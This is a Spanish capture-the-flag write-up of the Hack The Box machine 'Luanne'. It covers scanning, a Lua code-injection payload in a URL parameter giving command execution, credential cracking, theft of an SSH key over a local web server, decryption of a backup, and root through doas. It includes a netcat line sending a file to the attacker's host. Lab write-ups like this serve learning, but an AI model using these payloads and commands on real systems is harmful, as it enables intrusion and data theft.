
#  LUANNE MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/1.png)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.218 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p22,80,9001 -sV -sC 10.10.11.116 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/3.png)

## EXPLOTACION

Vemos que el vector de ataque es por via web ya que no los unicos puertos abiertos, aparte del SSH es el 80 y 9001. (Amobs http), al ver las paginas nos pide una autenticacion basica:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/4.png)

en la captura de nmap nos muestra que tiene un robots.txt y una ruta llamada **/weather**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/5.png)

vamos a esa ruta:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/6.png)

no nos muestra nada, intentemos hacer fuzzing:

```bash
wfuzz -c -t 100 --hw=159 --hc=400,404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://10.10.10.218/weather/FUZZ"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/7.png)

vemos que encontro a esa ruta, si vamos a esa ruta nos muestra un mensaje que dice que debemos especificar una ciudad:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/8.png)

si especificamos ese parametro, nos muestra las ciudades disponibles:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/9.png)

si colocamos una ciudad en especifico obtenemos datos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/10.png)

Se esta jugando con un parametro por la url, pienso que es posible a una injeccion SQL, pero para verlo mejor veamoslo desde **Burpsuite**, interceptemos la peticion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/11.png)

ahora mandemos una comilla simple al final:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/12.png)

vemos un error en un archivo llamado **/usr/local/webapi/weather.lua** al parecer es un script en Lua y si esta ejecutando codigo en Lua veamos como podemos ejecutar comandos en ese lenguaje:

[aqui](https://stackoverflow.com/questions/9676113/lua-os-execute-return-value) encontre como es la sintaxis:

```lua
os.execute("whoami")
```

vemos que una funcion termina en parentesis () y podemos comentar con -- -, entonces podemos podemos cerrar la funcion, poner la llamada al sistema y comentar lo demas que se ejecuta, para colocar la otra sentencia se puede poner **,**. El payload quedaria de la siguiente manera:

```bash
?city=London');os.execute('id')--
```

como es un parametro que va por la url es mejor hacerle un url encode por los caracteres especiales, desde burpsuite esto lo puedes hacer con **Ctrl+u** (asi esta en la imagen):

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/13.png)

por el resultado vemos que tenemos ejecucion remota de comandos (RCE), vamos a entablarnos una reverse shell:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/14.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/15.png)

### USER PIVOTING

somos un usuario que no tiene acceso a la flag, si vemos los direcotiros de **/home** vemos que hay un usuario **r.michaels** al cual debemos movernos, veamos que hay en el directorio donde nos encontramos:


![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/17.png)

vemos un archivo con unas credenciales, vamos a crackearlas, guardamos esa salida en un archivo en nuestra maquina kali y usamos hashcat:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/18.png)

ya tenemos unas credenciales.

realizando multiples enumeraciones, se encontro algo interesante al enumerar los procesos que se estan ejecutando en el equipo:

```bash
ps -waux
```

**NOTA: el parametro w es propio de BDS el sistema operativo de esta maquina**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/16.png)

vemos que el usuario al que necesitamos migrar esta ejecutando un comando:

```bash
/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home
```

esta ejecutando el demonio **httpd** con algunos parametros, veamos que son esos parametros:

[aqui la documentacion de httd](https://man.netbsd.org/httpd.8)

- -u: permite navegar a una ruta en especifica como el usuario que lo ejecuta.
- -X: Habilita la indexación de directorios. Se generará un índice de directorio solo cuando el archivo predeterminado (es decir, _index.html_ normalmente) no esta presente.
- -s: Obliga a que el registro se establezca siempre en stderr
- -i: Hace que la _dirección_ (IP) se utilice como dirección para vincular el modo demonio
- -I: puerto del servicio
- -L: se especifica un script de lua

hagamos una peticion GET a esa direccion desde la maquina:

```bash
curl -X GET "http://127.0.0.1:3001"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/19.png)

vemos que nos pide autenticacion basica y nosotros crackeamos unas, usemoslas que mas da:

```bash
curl -X GET "http://127.0.0.1:3001" -u "webapi_user:iamthebest"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/20.png)

ahora si nos muestra contenido asi que las credenciales son validas, revisando los parametros con los que ejecuto el usuario **r.michaels** el demonio **httpd** vemos que uso el parametro **-u** que permite ver una carpeta con los permisos del usuario, le paso la ruta **/home** y en la documentacion indica como colocar para ver el contenido de esa ruta:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/21.png)

modifiquemos la peticion:

```bash
curl -X GET "http://127.0.0.1:3001/~r.michaels/" -u "webapi_user:iamthebest"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/22.png)

vemos un contenido diferente, si copiamos la salida, lo guarmamos en un archivo en nuestra maquina kali y lo pipeamos con **html2text** vemos lo siguiente:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/23.png)

vemos como indice, contenido del usuario **r.michaels**, en especifico su **id_rsa**, veamos bien para usarla y conectarnos por SSH:

```bash
curl -X GET "http://127.0.0.1:3001/~r.michaels/id_rsa" -u "webapi_user:iamthebest"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/24.png)

la copiamos para conectarnos y podemos ver la primera flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/25.png)

## ELEVACION DE PRIVILEGIOS

vemos un directorio backups y en el un archivo con la extension **.tar.gz.enc** para un archivo comprimido pero cifrado (por el .enc), averiguando un poco vi que hay una herramienta para BSD para decifrar esros archivo llamada netpgp, usemosla:

```bash
netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output /tmp/data.tar.gz
```

lo guardo en **/tmp** ya que ahi se tiene permisos de escritura. Vamos a transferir la carpeta descifrada a nuestra maquina kali por netcat:

```bash
nc 10.10.14.4 4545 < data.tar.gz


rlwrap nc -lvnp 4545 > data.tar.gz
```

y lo descomprimimos:

```bash
tar -xf data.tar.gz
```

si lo vemos con **tree**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/26.png)

tiene la misma estructura donde se encontraban las credenciales, de hecho hay un archivo llamado .htpasswd donde encontramos credenciales, veamos si son las mismas:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/27.png)

vemos que no son las mismas, asi que tenemos otras credenciales.

en BSD (SO de la maquina) la forma de ver **sudo -l** es mediante un archivo llamado **doas.conf** es diferente este S.O., asi que busquemos el archivo en la maquina:

```bash
find / -name doas.conf 2>/dev/null
```

y vemos el contenido de ese archivo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/28.png)

dice que permite hacer las cosas a **r.michaels** como **root**, asi que podriamos lanzanos una shell privilegiada:

```bash
doas sh
```

pero nos pide contraseña, probemos con la nueva que crackeamos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/29.png)

estamos dentro y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/LUANNE/images/30.png)

